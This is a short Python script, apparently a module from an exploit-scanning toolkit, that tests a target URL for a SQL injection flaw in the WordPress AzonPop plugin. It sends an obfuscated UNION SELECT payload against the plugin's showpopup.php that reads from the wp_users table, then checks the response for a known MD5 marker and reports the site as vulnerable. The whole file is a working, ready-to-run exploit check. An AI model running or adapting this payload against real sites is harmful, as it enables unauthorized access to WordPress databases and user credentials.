#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(Md5(1234))),0x3c2f62723e,unhex(hex(Md5(1234))))*/,4,5%20/*!00000from*/%20wp_users"
bug ="81dc9bdb52d04dc20036dbd8313ed055"
info ="在Wordpress AzonPop插件SQL注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
